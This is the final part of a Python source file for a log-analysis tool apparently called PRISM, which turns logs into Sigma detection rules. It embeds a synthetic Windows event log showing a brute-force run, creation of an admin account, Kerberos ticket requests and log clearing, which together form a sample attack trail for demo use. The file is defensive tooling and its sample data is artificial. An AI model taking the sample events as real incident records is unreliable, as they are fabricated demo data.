        '      <TimeCreated SystemTime="2026-01-15T03:12:41.000Z"/>\n'
        '      <Computer>WEB01</Computer>\n'
        '    </System>\n'
        '    <EventData>\n'
        '      <Data Name="TargetUserName">administrator</Data>\n'
        '      <Data Name="IpAddress">203.0.113.42</Data>\n'
        '      <Data Name="LogonType">3</Data>\n'
        '    </EventData>\n'
        '  </Event>\n'
        '  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">\n'
        '    <System>\n'
        '      <Provider Name="Microsoft-Windows-Security-Auditing"/>\n'
        '      <EventID>4625</EventID>\n'
        '      <TimeCreated SystemTime="2026-01-15T03:12:47.000Z"/>\n'
        '      <Computer>WEB01</Computer>\n'
        '    </System>\n'
        '    <EventData>\n'
        '      <Data Name="TargetUserName">svc_sql</Data>\n'
        '      <Data Name="IpAddress">203.0.113.42</Data>\n'
        '      <Data Name="LogonType">3</Data>\n'
        '    </EventData>\n'
        '  </Event>\n'
        '  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">\n'
        '    <System>\n'
        '      <Provider Name="Microsoft-Windows-Security-Auditing"/>\n'
        '      <EventID>4625</EventID>\n'
        '      <TimeCreated SystemTime="2026-01-15T03:12:53.000Z"/>\n'
        '      <Computer>WEB01</Computer>\n'
        '    </System>\n'
        '    <EventData>\n'
        '      <Data Name="TargetUserName">jdoe</Data>\n'
        '      <Data Name="IpAddress">203.0.113.42</Data>\n'
        '      <Data Name="LogonType">3</Data>\n'
        '    </EventData>\n'
        '  </Event>\n'
        '  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">\n'
        '    <System>\n'
        '      <Provider Name="Microsoft-Windows-Security-Auditing"/>\n'
        '      <EventID>4625</EventID>\n'
        '      <TimeCreated SystemTime="2026-01-15T03:12:59.000Z"/>\n'
        '      <Computer>WEB01</Computer>\n'
        '    </System>\n'
        '    <EventData>\n'
        '      <Data Name="TargetUserName">backup_admin</Data>\n'
        '      <Data Name="IpAddress">203.0.113.42</Data>\n'
        '      <Data Name="LogonType">3</Data>\n'
        '    </EventData>\n'
        '  </Event>\n'
        '  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">\n'
        '    <System>\n'
        '      <Provider Name="Microsoft-Windows-Security-Auditing"/>\n'
        '      <EventID>4625</EventID>\n'
        '      <TimeCreated SystemTime="2026-01-15T03:13:05.000Z"/>\n'
        '      <Computer>WEB01</Computer>\n'
        '    </System>\n'
        '    <EventData>\n'
        '      <Data Name="TargetUserName">administrator</Data>\n'
        '      <Data Name="IpAddress">203.0.113.42</Data>\n'
        '      <Data Name="LogonType">3</Data>\n'
        '    </EventData>\n'
        '  </Event>\n'
        '  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">\n'
        '    <System>\n'
        '      <Provider Name="Microsoft-Windows-Security-Auditing"/>\n'
        '      <EventID>4720</EventID>\n'
        '      <TimeCreated SystemTime="2026-01-15T03:25:33.000Z"/>\n'
        '      <Computer>WEB01</Computer>\n'
        '    </System>\n'
        '    <EventData>\n'
        '      <Data Name="TargetUserName">svc_backup</Data>\n'
        '      <Data Name="SubjectUserName">administrator</Data>\n'
        '    </EventData>\n'
        '  </Event>\n'
        '  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">\n'
        '    <System>\n'
        '      <Provider Name="Microsoft-Windows-Security-Auditing"/>\n'
        '      <EventID>4732</EventID>\n'
        '      <TimeCreated SystemTime="2026-01-15T03:26:01.000Z"/>\n'
        '      <Computer>WEB01</Computer>\n'
        '    </System>\n'
        '    <EventData>\n'
        '      <Data Name="MemberName">svc_backup</Data>\n'
        '      <Data Name="TargetUserName">Administrators</Data>\n'
        '      <Data Name="SubjectUserName">administrator</Data>\n'
        '    </EventData>\n'
        '  </Event>\n'
        '  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">\n'
        '    <System>\n'
        '      <Provider Name="Microsoft-Windows-Security-Auditing"/>\n'
        '      <EventID>4769</EventID>\n'
        '      <TimeCreated SystemTime="2026-01-15T03:40:12.000Z"/>\n'
        '      <Computer>WEB01</Computer>\n'
        '    </System>\n'
        '    <EventData>\n'
        '      <Data Name="TargetUserName">svc_sql</Data>\n'
        '      <Data Name="ServiceName">MSSQLSvc/sql01.corp.local</Data>\n'
        '    </EventData>\n'
        '  </Event>\n'
        '  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">\n'
        '    <System>\n'
        '      <Provider Name="Microsoft-Windows-Security-Auditing"/>\n'
        '      <EventID>4769</EventID>\n'
        '      <TimeCreated SystemTime="2026-01-15T03:40:18.000Z"/>\n'
        '      <Computer>WEB01</Computer>\n'
        '    </System>\n'
        '    <EventData>\n'
        '      <Data Name="TargetUserName">svc_web</Data>\n'
        '      <Data Name="ServiceName">HTTP/intranet.corp.local</Data>\n'
        '    </EventData>\n'
        '  </Event>\n'
        '  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">\n'
        '    <System>\n'
        '      <Provider Name="Microsoft-Windows-Security-Auditing"/>\n'
        '      <EventID>4769</EventID>\n'
        '      <TimeCreated SystemTime="2026-01-15T03:40:24.000Z"/>\n'
        '      <Computer>WEB01</Computer>\n'
        '    </System>\n'
        '    <EventData>\n'
        '      <Data Name="TargetUserName">svc_files</Data>\n'
        '      <Data Name="ServiceName">CIFS/fileserver01.corp.local</Data>\n'
        '    </EventData>\n'
        '  </Event>\n'
        '  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">\n'
        '    <System>\n'
        '      <Provider Name="Microsoft-Windows-Eventlog"/>\n'
        '      <EventID>1102</EventID>\n'
        '      <TimeCreated SystemTime="2026-01-15T04:00:00.000Z"/>\n'
        '      <Computer>WEB01</Computer>\n'
        '    </System>\n'
        '    <EventData/>\n'
        '  </Event>\n'
        '</Events>\n'
    )),
}


def run_demo(args):
    """Run a demo analysis on a bundled sample log.

    PRISM is single-file, so the sample logs are embedded above rather
    than shipped as separate files. If a sample_logs/ folder happens to
    exist next to the script it's used as a cache; otherwise the sample
    is written out on first use (falling back to a temp dir if the
    script's own folder isn't writable)."""
    filename, content = SAMPLE_LOGS[args.type]
    script_dir = Path(__file__).resolve().parent
    log_path = script_dir / "sample_logs" / filename

    if not log_path.exists():
        try:
            log_path.parent.mkdir(parents=True, exist_ok=True)
            log_path.write_text(content, encoding="utf-8")
        except OSError:
            import tempfile
            tmp_dir = Path(tempfile.gettempdir()) / "prism_sample_logs"
            tmp_dir.mkdir(parents=True, exist_ok=True)
            log_path = tmp_dir / filename
            log_path.write_text(content, encoding="utf-8")

    console.print(f"\n[warn]▶ Running demo on:[/warn] [bold]{log_path.name}[/bold]\n")

    demo_args = argparse.Namespace(
        logfile=str(log_path),
        format="sigma",
        output="./output/rules",
        severity="all",
        verbose=True,
        no_banner=True,
    )
    run_analysis(demo_args)


def run_analysis(args):
    log_path = Path(args.logfile)
    if not log_path.exists():
        console.print(f"[bad]✗ Log file not found:[/bad] {args.logfile}")
        return

    output_dir = Path(args.output)
    output_dir.mkdir(parents=True, exist_ok=True)

    console.print(f"[bold white]Target:[/bold white]  {log_path.resolve()}")
    console.print(f"[bold white]Format:[/bold white]  {args.format.upper()}")
    console.print(f"[bold white]Output:[/bold white]  {output_dir.resolve()}")
    console.print(f"[bold white]Filter:[/bold white]  severity ≥ {args.severity}\n")

    pipeline = Pipeline(
        log_path=log_path,
        output_dir=output_dir,
        output_format=args.format,
        min_severity=args.severity,
        verbose=args.verbose,
        console=console,
    )
    pipeline.run()


if __name__ == "__main__":
    main()
